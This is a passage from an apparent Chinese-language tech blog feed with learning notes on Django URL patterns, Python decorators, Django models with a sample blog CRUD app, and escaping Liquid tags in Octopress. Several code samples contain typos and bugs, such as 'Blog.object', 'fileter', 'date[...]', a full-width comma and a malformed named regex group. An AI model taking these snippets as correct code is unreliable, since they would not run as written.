<figure class="highlight python"><figcaption><span>urls.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 无名组，以位置参数传递变量</span></div><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include, url</div><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"><span class="keyword">from</span> mysite <span class="keyword">import</span> views</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(<span class="string">r'^admin/'</span>, include(admin.site.urls)),</div><div class="line">    url(<span class="string">r'^articles/(\d&#123;4&#125;)/$'</span>， view.year_archive),</div><div class="line">    url(<span class="string">r'^articles/(\d&#123;4&#125;)/(\d&#123;2&#125;)/$'</span>, views.month_archive),</div><div class="line">]</div></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>urls.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 命名组，以关键字参数传递变量</span></div><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include, url</div><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"><span class="keyword">from</span> mysite <span class="keyword">import</span> views</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(<span class="string">r'^admin/'</span>, include(admin.site.urls)),</div><div class="line">    url(<span class="string">r'^articles/(?P&lt;year&gt;\d&#123;4&#125;)/$'</span>， view.year_archive),</div><div class="line">    url(<span class="string">r'^articles/(?P&lt;year&gt;\d&#123;4&#125;)/(?&lt;month&gt;\d&#123;2&#125;)/$'</span>, views.month_archive),</div><div class="line">]</div></pre></td></tr></table></figure>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[深入理解 Python 装饰器]]></title>
      <url>http://lexuslee.me/2015/12/07/2015-12-07-python-decorator-learning/</url>
      <content type="html"><![CDATA[<p>最近在写 Python+Django 的时候发现，有时候封装 API 的时候经常会遗失一些重复的装饰信息，但是直接封装到方法里是比较差劲的写法，因为有多个模块可能同时需要这些装饰信息，所以我希望使用一种可以迭代的装饰器。于是我在 <a href="http://stackoverflow.com/questions/739654/how-can-i-make-a-chain-of-function-decorators-in-python/1594484#1594484" target="_blank" rel="external">Stack Overflow</a> 上找到了相应的解答。下面以这篇解答为引写下我理解 Python decorator 的思路过程。<br><a id="more"></a></p>
<h2 id="装饰器是做什么用的？"><a href="#装饰器是做什么用的？" class="headerlink" title="装饰器是做什么用的？"></a>装饰器是做什么用的？</h2><p>装饰器实现对一个已有的模块做一些“修饰工作”，所谓修饰工作就是想给现有的模块加上一些小装饰（一些小功能，这些小功能可能好多模块都会用到），但又不让这个小装饰（小功能）侵入到原有的模块中的代码里去。</p>
<h2 id="装饰器的定义"><a href="#装饰器的定义" class="headerlink" title="装饰器的定义"></a>装饰器的定义</h2><p>首先，你需要知道 <a href="http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/00143449934543461c9d5dfeeb848f5b72bd012e1113d15000" target="_blank" rel="external">Python 的闭包</a>，接着发现3点 Python 的特性在装饰器中运用：</p>
<ol>
<li>函数可以赋值给一个变量。</li>
<li>函数可以定义在另一个函数内部。</li>
<li>函数名可以作为函数返回值。<br>辣么，先来看一段代码:<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTalk</span><span class="params">(type=<span class="string">"shout"</span>)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment"># 定义函数</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">shout</span><span class="params">(word=<span class="string">"yes"</span>)</span>:</span></div><div class="line">        <span class="keyword">return</span> word.capitalize()+<span class="string">"!"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">whisper</span><span class="params">(word=<span class="string">"yes"</span>)</span> :</span></div><div class="line">        <span class="keyword">return</span> word.lower()+<span class="string">"..."</span>;</div><div class="line"></div><div class="line">    <span class="comment"># 返回函数</span></div><div class="line">    <span class="keyword">if</span> type == <span class="string">"shout"</span>:</div><div class="line">        <span class="comment"># 没有使用"()", 并不是要调用函数，而是要返回函数对象</span></div><div class="line">        <span class="keyword">return</span> shout</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> whisper</div><div class="line"></div><div class="line"><span class="comment"># 如何使用？</span></div><div class="line"></div><div class="line"><span class="comment"># 将函数返回值赋值给一个变量</span></div><div class="line">talk = getTalk()</div><div class="line"></div><div class="line"><span class="comment"># 我们可以打印下这个函数对象</span></div><div class="line"><span class="keyword">print</span> talk</div><div class="line"><span class="comment">#outputs : &lt;function shout at 0xb7ea817c&gt;</span></div><div class="line"></div><div class="line"><span class="comment"># 这个对象是函数的返回值</span></div><div class="line"><span class="keyword">print</span> talk()</div><div class="line"><span class="comment">#outputs : Yes!</span></div><div class="line"></div><div class="line"><span class="comment"># 不仅如此，你还可以直接使用之</span></div><div class="line"><span class="keyword">print</span> getTalk(<span class="string">"whisper"</span>)()</div><div class="line"><span class="comment">#outputs : yes...</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>既然函数可以作为返回值，是不是函数也可以作为参数传递呢<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doSomethingBefore</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"I do something before then I call the function you gave me"</span></div><div class="line">    <span class="keyword">print</span> func()</div><div class="line"></div><div class="line">doSomethingBefore(scream)</div><div class="line"><span class="comment">#outputs:</span></div><div class="line"><span class="comment">#I do something before then I call the function you gave me</span></div><div class="line"><span class="comment">#Yes!</span></div></pre></td></tr></table></figure></p>
<p>所以看过这两段代码，你一定明白了，装饰器的定义。</p>
<p>装饰器就是封装器，可以让你在被装饰函数之前或之后执行代码，而不必修改函数本身代码。</p>
<h2 id="怎么写封装器："><a href="#怎么写封装器：" class="headerlink" title="怎么写封装器："></a>怎么写封装器：</h2><p>首先，我们来手写一个封装器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_decorator</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">()</span>:</span></div><div class="line">        print(<span class="string">"before the function runs"</span>)</div><div class="line">        func()</div><div class="line">        print(<span class="string">"after the function runs"</span>)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">along_func</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">"I am a alone function"</span>)</div><div class="line"></div><div class="line">decorated_along_func = new_decorator(along_func)</div><div class="line">decorated_along_func()</div><div class="line"></div><div class="line"><span class="comment">#outputs:</span></div><div class="line"><span class="comment">#before the function runs</span></div><div class="line"><span class="comment">#I am a alone function</span></div><div class="line"><span class="comment">#after the function runs</span></div></pre></td></tr></table></figure></p>
<p>这里每次调用 decorated_along_func 函数时，都会将 along_func 函数传入到装饰函数 new_decorator 中，完成封装。</p>
<h2 id="怎么写装饰器："><a href="#怎么写装饰器：" class="headerlink" title="怎么写装饰器："></a>怎么写装饰器：</h2><p>那将上例代码稍微进行修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_decorator</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">()</span>:</span></div><div class="line">        print(<span class="string">"before the function runs"</span>)</div><div class="line">        func()</div><div class="line">        print(<span class="string">"after the function runs"</span>)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@new_decorator</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">along_func</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">"I am a alone function"</span>)</div><div class="line"></div><div class="line">along_func()</div></pre></td></tr></table></figure></p>
<p>就会发现会得到相同的结果，这就是装饰器！</p>
<p>那么回到我最初的问题，装饰器能否迭代呢？</p>
<p>可以！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator1</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">()</span>:</span></div><div class="line">        print(<span class="string">"before the function runs"</span>)</div><div class="line">        func()</div><div class="line">        print(<span class="string">"after the function runs"</span>)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator2</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">()</span>:</span></div><div class="line">        print(<span class="string">"before the decorator1 runs"</span>)</div><div class="line">        func()</div><div class="line">        print(<span class="string">"after the decorator1 runs"</span>)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@decorator2</span></div><div class="line"><span class="meta">@decorator1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">along_func</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">"I am a alone function"</span>)</div><div class="line"></div><div class="line">along_func()</div><div class="line"></div><div class="line"><span class="comment">#outpus:</span></div><div class="line"><span class="comment">#before the decorator1 runs</span></div><div class="line"><span class="comment">#before the function runs</span></div><div class="line"><span class="comment">#I am a alone function</span></div><div class="line"><span class="comment">#after the function runs</span></div><div class="line"><span class="comment">#after the decorator1 runs</span></div></pre></td></tr></table></figure>
<p>这种特性十分的便捷，但是必须注意装饰器的顺序。</p>
<p>如果上例代码写成：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@decorator1</span></div><div class="line"><span class="meta">@decorator2</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">along_func</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">"I am a alone function"</span>)</div></pre></td></tr></table></figure></p>
<p>那么结果将变为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">before the function runs</div><div class="line">before the decorator1 runs</div><div class="line">I am a alone function</div><div class="line">after the decorator1 runs</div><div class="line">after the function runs</div></pre></td></tr></table></figure></p>
<h2 id="一些迭代装饰器的用法"><a href="#一些迭代装饰器的用法" class="headerlink" title="一些迭代装饰器的用法"></a>一些迭代装饰器的用法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># bold装饰器</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">makebold</span><span class="params">(fn)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">()</span>:</span></div><div class="line">        <span class="comment"># 在前后加入标签</span></div><div class="line">        <span class="keyword">return</span> <span class="string">"&lt;b&gt;"</span> + fn() + <span class="string">"&lt;/b&gt;"</span></div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="comment"># italic装饰器</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeitalic</span><span class="params">(fn)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">()</span>:</span></div><div class="line">        <span class="comment"># 加入标签</span></div><div class="line">        <span class="keyword">return</span> <span class="string">"&lt;i&gt;"</span> + fn() + <span class="string">"&lt;/i&gt;"</span></div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@makebold</span></div><div class="line"><span class="meta">@makeitalic</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"hello"</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> say()</div><div class="line"><span class="comment">#outputs: &lt;b&gt;&lt;i&gt;hello&lt;/i&gt;&lt;/b&gt;</span></div><div class="line"></div><div class="line"><span class="comment"># 等价的代码</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"hello"</span></div><div class="line">say = makebold(makeitalic(say))</div><div class="line"></div><div class="line"><span class="keyword">print</span> say()</div><div class="line"><span class="comment">#outputs: &lt;b&gt;&lt;i&gt;hello&lt;/i&gt;&lt;/b&gt;</span></div></pre></td></tr></table></figure>
<p>是不是灰常炫酷。</p>
<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><p>关于更多装饰器的高级用法，你可以戳以下链接：</p>
<p><a href="https://wiki.python.org/moin/PythonDecoratorLibrary" target="_blank" rel="external">戳我</a></p>
<p>关于 Python Decroator 的各种提案，可以参看：</p>
<p><a href="https://wiki.python.org/moin/PythonDecoratorProposals" target="_blank" rel="external">Python Decorator Proposals</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ Django 学习笔记3-- Models ]]></title>
      <url>http://lexuslee.me/2015/11/21/2015-11-21-django-learning3/</url>
      <content type="html"><![CDATA[<h2 id="MTV-vs-MVC"><a href="#MTV-vs-MVC" class="headerlink" title="MTV vs MVC"></a>MTV vs MVC</h2><p>正如在之前<a href="http://thehackercat.me/blog/2015/11/14/django-learning1/" target="_blank" rel="external">这篇文章</a>所提到的， 把数据存取逻辑、业务逻辑和表现逻辑组合在一起的概念有时被称为软件架构的 Model-View-Controller ( MVC )模式。 在这个模式中， Model 代表数据存取层，View 代表的是系统中选择显示什么和怎么显示的部分，Controller 指的是系统中根据用户输入并视需要访问模型，以决定使用哪个视图的那部分。</p>
<a id="more"></a>
<p>而 Django 使用的更多的则是模型( Model )、模板( Template )和视图( Views )的软件设计模式，称为 MTV 模式。我在 Stack Overflow 的<a href="http://stackoverflow.com/questions/6621653/django-vs-model-view-controller" target="_blank" rel="external">这个回答</a>里找到了对于 MTV vs MVC 两种设计模式间的微妙的差别。</p>
<p>其中提到，不能简单的把 Django 视图认为是 MVC 控制器，把 Django 模板认为是 MVC 视图。</p>
<p>两者之间的差别在于，在 Django 中，视图( Views )不处理用户输入，而是用来选择要展示的哪些数据，而不是要如何展示数据。而 Django 模板 仅仅决定如何展现Django视图指定的数据。</p>
<p>或者说, Django 将 MVC 中的视图进一步分解为 Django 视图 和 Django 模板两个部分，分别决定 “展现哪些数据” 和 “如何展现”，使得 Django 的模板可以根据需要随时替换，而不仅仅限制于内置的模板。至于 MVC 控制器部分，由 Django 框架的 URLconf 来实现。</p>
<h2 id="模型练手"><a href="#模型练手" class="headerlink" title="模型练手"></a>模型练手</h2><p>为了深入了解 Django Models 对数据的操作，我写了一个简单的博客模型作为练手。</p>
<p>在新建模型时遇到了一个 App migrations 问题如下：</p>
<p><img src="http://thehackercat-hackercat.stor.sinaapp.com/model%20error%201.png" alt="Model CommandError"></p>
<p>后来发现是由于 Django 版本问题，在最近版本把 migrations 移出了所创建的 App 的根目录，只需要执行<figure class="highlight python"><figcaption><span>manage.py makemigration```接着再执行```python manage.py migrate```即可解决。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">写了个简单的博客的增删改查，代码如下：</div><div class="line">``` python <span class="comment">#view.py </span></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*-coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</div><div class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponseRedirect</div><div class="line"><span class="keyword">from</span> blog.models <span class="keyword">import</span> Blog</div><div class="line"><span class="keyword">from</span> blog <span class="keyword">import</span> forms</div><div class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> RequestContext</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blog_list</span><span class="params">(request)</span>:</span></div><div class="line">    blog_list = Blog.objects.all()</div><div class="line">    <span class="keyword">return</span> render(request,<span class="string">"blog_list.html"</span>,&#123;<span class="string">'blog_list'</span>:blog_list&#125;)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blog_form</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">        form = forms.BlogForm(request.POST)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> form.is_valid():</div><div class="line">            data = form.cleaned_data</div><div class="line"></div><div class="line">            <span class="keyword">if</span> <span class="string">'id'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</div><div class="line">                blog = Blog(title=data[<span class="string">'title'</span>],author=data[<span class="string">'author'</span>],content=data[<span class="string">'content'</span>])</div><div class="line">                blog.save()</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                blog = Blog.object.get(id=data.id)</div><div class="line">                blog.title = data[<span class="string">'title'</span>]</div><div class="line">                blog.author = date[<span class="string">'author'</span>]</div><div class="line">                blog.content = data[<span class="string">'content'</span>]</div><div class="line">                blog.save()</div><div class="line">            <span class="keyword">return</span> HttpResponseRedirect(<span class="string">'/blog/list'</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            form = forms.BlogForm()</div><div class="line">            <span class="keyword">return</span> render(request,<span class="string">"blog_form.html"</span>,context_instance=RequestContext(request))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blog_del</span><span class="params">(request)</span>:</span></div><div class="line">    errors = []</div><div class="line">    <span class="keyword">if</span> <span class="string">'id'</span> <span class="keyword">in</span> request.GET:</div><div class="line">        bid_ = request.GET[<span class="string">'id'</span>]</div><div class="line">        Blog.objects.fileter(id=bid_).delete()</div><div class="line">        <span class="keyword">return</span> HttpResponseRedirect(<span class="string">'/blog/list'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blog_view</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'id'</span> <span class="keyword">in</span> request.GET:</div><div class="line">        bid_ = request.GET[<span class="string">'id'</span>]</div><div class="line">        blog = Blog.object.get(id=bid_)</div><div class="line">        form = forms.BlogForm(</div><div class="line">            initial = &#123;<span class="string">'id'</span>:blog.id,<span class="string">'title'</span>:blog.title,<span class="string">'author'</span>:blog.author,<span class="string">'content'</span>:blog.content&#125;</div><div class="line">        )</div><div class="line">        <span class="keyword">return</span> render(request,<span class="string">"blog_form.html"</span>,&#123;<span class="string">'form'</span>:form&#125;,context_instance=RequestContext(request))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        errors.append(<span class="string">"参数异常请刷新后重试"</span>)</div><div class="line">        <span class="keyword">return</span> render(request,<span class="string">"blog_list.html"</span>,&#123;<span class="string">'errors'</span>:errors&#125;)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blog_edit</span><span class="params">(request)</span>:</span></div><div class="line">    errors = []</div><div class="line">    <span class="keyword">if</span> <span class="string">'id'</span> <span class="keyword">in</span> request.GET:</div><div class="line">        bid_ = request.GET[<span class="string">'id'</span>]</div><div class="line">        blog = Blog.objects.get(id=bid_)</div><div class="line">        form = forms.BlogForm(</div><div class="line">                initial = &#123;<span class="string">'id'</span>:blog.id,<span class="string">'title'</span>:blog.title,<span class="string">'author'</span>:blog.author,<span class="string">'content'</span>:blog.content&#125;</div><div class="line">        )</div><div class="line">        <span class="keyword">return</span> render_to_response(<span class="string">"blog_form.html"</span>,&#123;<span class="string">'form'</span>:form&#125;,context_instance=RequestContext(request))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        errors.append(<span class="string">"参数异常请刷新后重试"</span>)</div><div class="line">        <span class="keyword">return</span> render(request,<span class="string">"blog_list.html"</span>,&#123;<span class="string">'errors'</span>:errors&#125;)</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><figcaption><span>#form.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*-coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogForm</span><span class="params">(forms.Form)</span>:</span></div><div class="line">    title =  forms.CharField(label=<span class="string">'标题'</span>)</div><div class="line">    author = forms.CharField(label=<span class="string">'作者'</span>)</div><div class="line">    content = forms.CharField(label=<span class="string">'正文'</span>,widget=forms.Textarea)</div></pre></td></tr></table></figure>
<p>其中 CharField() 相当于赋予了 title 表段 varchar 的属性。</p>
<p>object.all() 相当于执行了一条<code>select * from blog</code>的 sql 语句。</p>
<p>object.get() 相当于执行了一条<code>select * from blog where id=&#39;bid_&#39;</code>的获取单个对象的 sql 语句。</p>
<p>object.save() 相当于执行了<code>UPDATE blog SET ...</code>的 sql 语句。</p>
<p>并用 errors[] 列表来捕捉错误信息，一般防止出现错误的 sql 语句时增加了 blog 表段中的 id 号而其余属性值为空的情况。</p>
<p>感觉相比于 ThinkinPHP 操作表单 GET/POST 请求以及处理数据库方面要方便得多。</p>
<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><p>MVC 框架大大缩小了开发者对数据存储的直接操作，框架自动生成 sql 语句并空值数据的存取等。以后写 sql 感觉就跟 Excel 一样了，那应该怎么优化 sql 呢。</p>
<p>顺便吐槽一下，最近 GitHub Repositorie 换新的布局，天热噜，怎么能这么丑！</p>
<p><img src="http://thehackercat-hackercat.stor.sinaapp.com/dontstudyCS.jpg" alt="Dont learn CS"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[在 Octopress 中生成包含 liquid 语句的代码]]></title>
      <url>http://lexuslee.me/2015/11/20/2015-11-20-blog-with-liquid/</url>
      <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>由于之前写 <a href="http://thehackercat.me/blog/2015/11/16/django-learning2/" target="_blank" rel="external">Django – Templates</a> 篇时要用到包含 Liquid 语法的示例代码，而 Octopress (Jekyll) 在后端使用 Liquid 来处理生成 Web Pages ，对于文章内部插入的原本用来作示例的 Liquid 代码会被解析成 Web Pages 生成语句而不是原本的内容。故苦恼了我一会儿 Q.Q </p>
<p><del>不过这都不是事儿</del></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>比如，我之前写的<br><a id="more"></a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;% raw %&#125;</div><div class="line">&#123;% if variable %&#125; </div><div class="line">&#123;% else %&#125; </div><div class="line">&#123;% endif %&#125;</div><div class="line">&#123;% endraw %&#125;</div></pre></td></tr></table></figure></p>
<p>就会因为包含了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% raw %&#125;&#123;% ... %&#125;&#123;% endraw %&#125;</div></pre></td></tr></table></figure>
<p>解决方法是：</p>
<p>在每一块包含 Liquid 语句的代码快前后用 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; "&#123;% raw " &#125;&#125;%&#125; 和 &#123;&#123; "&#123;% endraw " &#125;&#125;%</div></pre></td></tr></table></figure>
<p>包括起来。</p>
<p>这样就能确保示例代码不会被错误的解析成 Jekyll Web Pages 生成语句。</p>
<p>但是如果我要显示</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; "&#123;% raw " &#125;&#125;%&#125; 和 &#123;&#123; "&#123;% endraw " &#125;&#125;%&#125;</div></pre></td></tr></table></figure>
<p>怎么办呢 ？</p>
<p>我试着使用使用如下方法：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; "&#123;% raw " &#125;&#125;%&#125;</div><div class="line">&#123;&#123; "&#123;% raw " &#125;&#125;%&#125;</div><div class="line">&#123;&#123; "&#123;% endraw " &#125;&#125;%&#125;</div><div class="line">&#123;&#123; "&#123;% endraw " &#125;&#125;%&#125;</div></pre></td></tr></table></figure></p>
<p>来显示一个</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; "&#123;% raw " &#125;&#125;%&#125; 和 &#123;&#123; "&#123;% endraw " &#125;&#125;%&#125;</div></pre></td></tr></table></figure>
<p>后来我在 <a href="http://stackoverflow.com/questions/3426182/how-to-escape-liquid-template-tags" target="_blank" rel="external">Stack Overflow</a> 找到了一个回答：</p>
<p>使用 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% raw %&#125;&#123;&#123; "&#123;% raw " &#125;&#125;%&#125;&#123;% endraw %&#125;</div></pre></td></tr></table></figure>
<p>就可以得到 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; "&#123;% raw " &#125;&#125;%&#125;</div></pre></td></tr></table></figure>
